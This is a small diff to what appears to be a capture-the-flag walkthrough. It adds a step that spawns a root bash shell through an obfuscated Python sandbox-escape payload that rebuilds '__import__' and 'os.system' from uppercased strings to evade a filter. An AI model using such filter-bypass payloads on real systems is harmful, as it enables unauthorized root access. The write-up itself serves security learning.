@@ -243,6 +243,16 @@ __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lowe
 
 ![](attachments/20240329123322.png)
 
+OR
+
+We can spawn a bash shell `/bin/bash` as root:
+
+![](attachments/20240329174343.png)
+
+```
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash') 
+```
+
 The End.
 
 ![](https://giffiles.alphacoders.com/132/13246.gif)
